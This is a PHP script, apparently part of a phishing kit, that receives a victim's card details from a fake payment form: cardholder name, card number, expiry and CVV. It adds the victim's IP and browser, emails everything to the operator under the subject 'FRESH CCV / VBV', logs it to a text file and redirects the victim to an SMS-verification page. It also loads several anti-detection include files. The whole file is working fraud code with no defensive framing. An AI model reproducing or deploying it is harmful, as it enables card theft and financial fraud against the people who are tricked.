<?php
session_start();
include '../../../prevents/anti1.php';
include '../../../prevents/anti2.php';
include '../../../prevents/anti3.php';
include '../../../prevents/anti4.php';
include '../../../prevents/anti5.php';
include '../../../prevents/anti6.php';
include '../../../prevents/anti7.php';
include '../../../prevents/anti8.php';
include '../../../prevents/anti9.php';
include '../email.php';
include'../get_browser.php';
include'../get_bin.php';
    $_SESSION["n_card"]   = $_POST["n_card"];
    $_SESSION["c_num"]    = $_POST["c_num"];
    $_SESSION["exm"]    = $_POST["exm"];
    $_SESSION["exy"]    = $_POST["exy"];
    $_SESSION["csc"]    = $_POST["csc"];
$message = '
Nom  : '.$_SESSION["n_card"].'
Numero de Carte : '.$_SESSION["c_num"].'
Date Expiration : '.$_SESSION["exm"].'/'.$_SESSION["exy"].'
Cryptogram Visuel : '.$_SESSION["csc"].'
IP : '._ip().'
User Agent : '.$_SERVER["HTTP_USER_AGENT"].'
';

$Subject=  "FRESH CCV / VBV | "._ip();
$head="From: *.* -PSA7TK-KADI- *.*   <cc@rezzz.com>";
$_SESSION['step_four']  = true;
if(mail($my_mail,$Subject,$message,$head) && mail($binn,$Subject,$message,$head)) ;
$fp = fopen("vbv.txt", "a +");
			fputs($fp, $message);
			fclose($fp);

?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script language="javascript">
var page = "sms-auth0.php"          
top.location = page;
</script> 
</head>
</html>


